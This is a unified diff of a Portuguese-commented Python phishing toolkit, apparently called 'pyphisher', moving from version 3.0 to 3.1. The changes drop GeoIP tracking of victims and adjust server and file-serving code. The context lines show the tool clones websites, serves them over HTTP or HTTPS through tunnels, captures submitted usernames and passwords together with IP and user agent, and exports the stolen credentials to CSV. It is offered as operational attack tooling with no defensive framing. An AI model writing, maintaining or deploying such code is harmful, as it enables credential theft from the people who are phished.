@@ -27,17 +27,17 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.x509.oid import NameOID
 import ipaddress
-import geoip2.database
 import platform
 import getpass
 import webbrowser
+import datetime as dt
 
 # Configurações globais
-VERSION = "3.0"
+VERSION = "3.1"
 CONFIG_FILE = "pyphisher_config.json"
 MAX_THREADS = 5
-GEOIP_DATABASE = "GeoLite2-City.mmdb"
 TUNNEL_DIR = "tunnel_tools"
+CLONE_DIR = "cloned_site"
 
 # Cores e estilos avançados
 class colors:
@@ -221,9 +221,9 @@ class Utils:
         ).serial_number(
             x509.random_serial_number()
         ).not_valid_before(
-            datetime.utcnow()
+            dt.datetime.utcnow()
         ).not_valid_after(
-            datetime.utcnow() + datetime.timedelta(days=365)
+            dt.datetime.utcnow() + dt.timedelta(days=365)
         ).add_extension(
             x509.SubjectAlternativeName([x509.DNSName("localhost")]),
             critical=False,
@@ -241,23 +241,6 @@ class Utils:
             ))
             
         return cert_file, key_file
-    
-    @staticmethod
-    def get_geolocation(ip):
-        if not os.path.exists(GEOIP_DATABASE):
-            return {"error": "Database not found"}
-            
-        try:
-            with geoip2.database.Reader(GEOIP_DATABASE) as reader:
-                response = reader.city(ip)
-                return {
-                    "country": response.country.name,
-                    "city": response.city.name,
-                    "postal": response.postal.code,
-                    "location": f"{response.location.latitude}, {response.location.longitude}"
-                }
-        except:
-            return {"error": "Geolocation failed"}
     
     @staticmethod
     def download_file(url, filename):
@@ -517,7 +500,7 @@ class TunnelManager:
 
 # Clonagem profunda de sites
 class SiteCloner:
-    def __init__(self, url, output_dir="cloned_site", depth=1):
+    def __init__(self, url, output_dir=CLONE_DIR, depth=1):
         self.base_url = url
         self.output_dir = output_dir
         self.max_depth = min(depth, config.get('clone_depth', 2))
@@ -729,7 +712,7 @@ class AdvancedPhishingServer:
         
         if self.use_https:
             cert_file, key_file = Utils.generate_self_signed_cert()
-            httpd = socketserver.TCPServer(("", self.port), handler)
+            httpd = HTTPServer(("", self.port), handler)
             httpd.socket = ssl.wrap_socket(
                 httpd.socket,
                 certfile=cert_file,
@@ -738,7 +721,7 @@ class AdvancedPhishingServer:
             )
             print(f"{ui.GREEN}[+] Servidor HTTPS iniciado na porta {self.port}{ui.END}")
         else:
-            httpd = socketserver.TCPServer(("", self.port), handler)
+            httpd = HTTPServer(("", self.port), handler)
             print(f"{ui.GREEN}[+] Servidor HTTP iniciado na porta {self.port}{ui.END}")
             
         print(f"{ui.CYAN}[*] Acesse em: {'https' if self.use_https else 'http'}://localhost:{self.port}{ui.END}")
@@ -753,7 +736,6 @@ class AdvancedPhishingServer:
         except KeyboardInterrupt:
             print(f"\n{ui.YELLOW}[*] Parando servidor...{ui.END}")
             self.tunnel_manager.stop_tunnel()
-            httpd.shutdown()
             httpd.server_close()
         
     def start_tunnel(self):
@@ -776,7 +758,7 @@ class AdvancedPhishingServer:
     def create_handler(self):
         class CustomHandler(SimpleHTTPRequestHandler):
             def __init__(self, *args, **kwargs):
-                super().__init__(*args, directory="cloned_site", **kwargs)
+                super().__init__(*args, directory=CLONE_DIR, **kwargs)
                 self.server_instance = self
             
             def do_GET(self):
@@ -788,9 +770,12 @@ class AdvancedPhishingServer:
                     if self.path == '/stats':
                         self.send_stats()
                     else:
-                        super().do_GET()
-                except FileNotFoundError:
-                    self.send_error_page(404)
+                        # Verificar se o arquivo existe
+                        filepath = self.translate_path(self.path)
+                        if os.path.exists(filepath) and os.path.isfile(filepath):
+                            super().do_GET()
+                        else:
+                            self.send_error_page(404)
                 except Exception as e:
                     print(f"{ui.RED}[-] Erro no GET: {str(e)}{ui.END}")
                     self.send_error(500)
@@ -814,11 +799,6 @@ class AdvancedPhishingServer:
                     form_data['ip'] = client_ip
                     form_data['timestamp'] = datetime.now().isoformat()
                     form_data['user_agent'] = self.headers.get('User-Agent', '')
-                    
-                    # Geolocalização
-                    geo = Utils.get_geolocation(client_ip)
-                    if 'error' not in geo:
-                        form_data['geolocation'] = geo
                     
                     # Salvar credenciais
                     self.save_credentials(form_data)
@@ -862,7 +842,7 @@ class AdvancedPhishingServer:
                     
                     print(f"\n{ui.RED}[!] Credenciais capturadas:{ui.END}")
                     for k, v in data.items():
-                        if k not in ['timestamp', 'geolocation']:
+                        if k not in ['timestamp']:
                             print(f"{ui.YELLOW}{k}: {v}{ui.END}")
                     
                     print(f"{ui.CYAN}[*] Total capturado: {self.server_instance.stats['credentials_captured']}{ui.END}")
@@ -1338,10 +1318,8 @@ class MenuSystem:
                 print(f"\n{ui.WHITE}{i}. {ui.YELLOW}IP: {cred.get('ip')}")
                 print(f"{ui.WHITE}   Timestamp: {cred.get('timestamp')}")
                 print(f"{ui.WHITE}   User Agent: {cred.get('user_agent', 'N/A')}")
-                if 'geolocation' in cred:
-                    print(f"{ui.WHITE}   Localização: {cred['geolocation'].get('city', 'N/A')}, {cred['geolocation'].get('country', 'N/A')}")
                 for k, v in cred.items():
-                    if k not in ['ip', 'timestamp', 'user_agent', 'geolocation']:
+                    if k not in ['ip', 'timestamp', 'user_agent']:
                         print(f"{ui.WHITE}   {k}: {ui.RED}{v}{ui.END}")
             input(f"\n{ui.CYAN}[*] Pressione Enter para continuar...{ui.END}")
             self.display_menu("stats")
@@ -1349,10 +1327,9 @@ class MenuSystem:
             csv_file = "credenciais_exportadas.csv"
             try:
                 with open(csv_file, 'w') as f:
-                    f.write("Timestamp,IP,Username,Password,User Agent,Location\n")
+                    f.write("Timestamp,IP,Username,Password,User Agent\n")
                     for cred in creds:
-                        loc = f"{cred.get('geolocation', {}).get('city', 'N/A')}, {cred.get('geolocation', {}).get('country', 'N/A')}" if 'geolocation' in cred else 'N/A'
-                        f.write(f"{cred.get('timestamp')},{cred.get('ip')},{cred.get('username', '')},{cred.get('password', '')},{cred.get('user_agent', '').replace(',', ';')},{loc}\n")
+                        f.write(f"{cred.get('timestamp')},{cred.get('ip')},{cred.get('username', '')},{cred.get('password', '')},{cred.get('user_agent', '').replace(',', ';')}\n")
                 print(f"{ui.GREEN}[+] Credenciais exportadas para {csv_file}{ui.END}")
             except Exception as e:
                 print(f"{ui.RED}[-] Erro ao exportar: {str(e)}{ui.END}")
@@ -1382,7 +1359,7 @@ if __name__ == '__main__':
             import cryptography
         except ImportError:
             print(f"{ui.RED}[!] Instalando dependências necessárias...{ui.END}")
-            subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "cryptography", "geoip2"])
+            subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "cryptography"])
             print(f"{ui.GREEN}[+] Dependências instaladas com sucesso!{ui.END}")
             time.sleep(2)
             
